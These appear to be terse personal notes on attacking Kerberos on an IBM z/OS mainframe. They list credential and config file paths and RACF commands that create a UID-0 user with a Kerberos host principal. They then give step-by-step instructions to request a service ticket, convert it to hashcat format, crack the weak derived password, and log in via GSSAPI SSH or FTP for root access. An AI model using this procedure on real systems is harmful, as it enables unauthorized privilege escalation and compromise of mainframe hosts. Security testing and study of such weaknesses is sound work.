important kerb files:
/usr/lpp/skrb/bin

/var/skrb/creds/

/etc/skrb
/etc/skrb/krb5.conf
/etc/skrb/home/envar


racf resources:


step 1:
is kerberos on
external: port 88 and 469
internal: /usr/lpp/skrb/bin/kinit randomprinc -> Status 0x96c73a06 - Client principal is not found in security registr

step 2:
check file permisions of all the important files

step 3:
view accepted encryption in envar and krb5.conf

ADDUSER SSHDAEM DFLTGRP(SYS1) PASSWORD(tmppass) OMVS(UID(0) PROGRAM('/bin/sh') HOME('/') SHARED)
ALTUSER SSHDAEM DFLTGRP(SYS1) PASSWORD(password) NOEXPIRED KERB(KERBNAME('host/zos.jake.net'))
ALTUSER SSHDAEM NOPASSWORD
You need the password for a client on the domain so jake/zos.jake.net
GET TGS for host/zos.jake.net
convert enc data of ticket in tgs to hashcat format
crack the password for host/zos.jake.net - its derived from password so monocase and max 8 letters
kinit host/zos.jake.net - enter the password you cracked
you cant login normally as SSHDAEM has NOPASSWORD
ssh with gsspi or ftp zos.jake.net -a gssapi
you now have access to a root account because SSHDAEM has omvs(uid(0))
